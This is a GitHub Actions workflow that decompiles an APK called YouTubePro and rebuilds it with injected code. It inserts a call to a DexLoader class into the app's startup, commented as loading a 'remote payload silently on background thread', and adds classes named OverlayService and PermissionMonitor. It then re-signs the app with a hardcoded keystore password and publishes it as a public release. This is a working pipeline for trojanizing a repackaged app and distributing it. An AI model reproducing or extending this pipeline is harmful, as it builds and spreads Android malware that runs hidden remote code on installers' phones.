name: Build APK

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
      - name: Checkout repo
        uses: actions/checkout@v4

      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'

      - name: Install apktool
        run: |
          wget -q https://github.com/iBotPeaches/Apktool/releases/download/v2.11.1/apktool_2.11.1.jar \
               -O /usr/local/bin/apktool.jar
          printf '#!/bin/bash\njava -jar /usr/local/bin/apktool.jar "$@"\n' \
               | sudo tee /usr/local/bin/apktool > /dev/null
          sudo chmod +x /usr/local/bin/apktool
          apktool --version

      - name: Decompile original APK
        run: |
          ls -lh attached_assets/
          apktool d attached_assets/YouTubePro_1785357223541.apk \
            -o build/decompiled \
            --no-src \
            -f
          echo "=== Smali folders after decompile ==="
          ls build/decompiled/
          echo "=== Smali class count ==="
          find build/decompiled/smali* -name "*.smali" 2>/dev/null | wc -l

      - name: Inject DexLoader into StubApp
        run: |
          STUBAPP="build/decompiled/smali/com/stub/StubApp.smali"
          if [ ! -f "$STUBAPP" ]; then
            STUBAPP=$(find build/decompiled/smali* -name "StubApp.smali" 2>/dev/null | head -1)
          fi
          echo "Found StubApp: $STUBAPP"

          # Cek apakah DexLoader sudah diinjeksikan sebelumnya
          if grep -q "DexLoader" "$STUBAPP"; then
            echo "DexLoader already injected, skipping"
          else
            # Inject setelah invoke-super attachBaseContext
            sed -i 's/invoke-super {p0, p1}, Landroid\/app\/Application;->attachBaseContext(Landroid\/content\/Context;)V/invoke-super {p0, p1}, Landroid\/app\/Application;->attachBaseContext(Landroid\/content\/Context;)V\n\n    # DDL: load remote payload silently on background thread\n    invoke-static {p1}, Lcom\/ddl\/DexLoader;->load(Landroid\/content\/Context;)V/' "$STUBAPP"
            echo "DexLoader injected successfully"
          fi

          grep -A 3 "DexLoader" "$STUBAPP" || echo "Injection not found - checking manually"

      - name: Copy DDL smali classes
        run: |
          # Copy DexLoader, OverlayService, PermissionMonitor ke build/decompiled
          mkdir -p build/decompiled/smali/com/ddl
          mkdir -p build/decompiled/smali/com/payload

          for f in apk-source/YouTubePro/smali/com/ddl/*.smali; do
            cp "$f" build/decompiled/smali/com/ddl/
            echo "Copied: $f"
          done

          echo "=== DDL classes in build ==="
          ls build/decompiled/smali/com/ddl/

      - name: Rebuild APK
        run: |
          mkdir -p output
          apktool b build/decompiled -o output/YouTubePro-mod-unsigned.apk
          echo "=== APK built ==="
          ls -lh output/YouTubePro-mod-unsigned.apk

      - name: Generate debug keystore
        run: |
          keytool -genkey -v \
            -keystore keystore.jks \
            -alias ytpro \
            -keyalg RSA \
            -keysize 2048 \
            -validity 10000 \
            -dname "CN=YouTubePro, OU=Dev, O=YTPro, L=ID, S=ID, C=ID" \
            -storepass ytpro123 \
            -keypass ytpro123 \
            -noprompt

      - name: Sign APK (zipalign + apksigner)
        run: |
          BUILD_TOOLS=$(ls $ANDROID_HOME/build-tools/ | sort -V | tail -1)
          BT="$ANDROID_HOME/build-tools/$BUILD_TOOLS"

          $BT/zipalign -v -p 4 \
            output/YouTubePro-mod-unsigned.apk \
            output/YouTubePro-mod-aligned.apk

          $BT/apksigner sign \
            --ks keystore.jks \
            --ks-key-alias ytpro \
            --ks-pass pass:ytpro123 \
            --key-pass pass:ytpro123 \
            --out output/YouTubePro-mod.apk \
            output/YouTubePro-mod-aligned.apk

          echo "=== APK signed ==="
          ls -lh output/YouTubePro-mod.apk

      - name: Upload APK artifact
        uses: actions/upload-artifact@v4
        with:
          name: YouTubePro-mod-${{ github.run_number }}
          path: output/YouTubePro-mod.apk
          retention-days: 30

      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: build-${{ github.run_number }}
          name: "Build #${{ github.run_number }}"
          body: |
            🤖 Auto-built APK from commit ${{ github.sha }}
            - Branch: ${{ github.ref_name }}
            - Date: ${{ github.event.head_commit.timestamp }}
            - Classes: decompiled fresh from original APK + DDL injection
          files: output/YouTubePro-mod.apk
          token: ${{ secrets.GITHUB_TOKEN }}
